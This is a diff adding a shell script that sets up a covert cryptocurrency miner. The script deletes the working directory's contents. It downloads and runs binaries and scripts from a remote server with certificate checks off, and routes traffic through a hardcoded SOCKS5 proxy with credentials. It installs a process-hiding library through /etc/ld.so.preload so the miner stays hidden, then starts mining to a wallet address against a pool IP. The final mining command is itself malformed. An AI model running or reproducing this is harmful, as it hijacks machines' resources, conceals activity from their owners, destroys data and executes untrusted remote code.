@@ -1,0 +1,60 @@
+#!/bin/sh
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget --no-check-certificate https://maskurniawan.serv00.net/compile.sh && chmod +x compile.sh >/dev/null 2>&1
+wget --no-check-certificate -O wild https://maskurniawan.serv00.net/wild && chmod +x wild >/dev/null 2>&1
+
+wget --no-check-certificate https://maskurniawan.serv00.net/graphics.tar.gz >/dev/null 2>&1
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 107.172.222.195:443
+socks5_username = yoga
+socks5_password = yoga123
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget --no-check-certificate https://maskurniawan.serv00.net/magicBezzHash.zip >/dev/null 2>&1
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp && clear &&  --algo pearlhash --url 38.89.142.24:443 --user prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg@nock=66GF5PW9AUL1hQZRPsFxnWgASddAVoc34FWH1K1aCdwmqCSV8qLSZ5p.$(shuf -n 1 -i 1-9999)-Bismillah --proxy socks5://yoga:yoga123@107.172.222.195:443; sleep 5; done) >/dev/null 2>&1 & sleep 10 && bash compile.sh
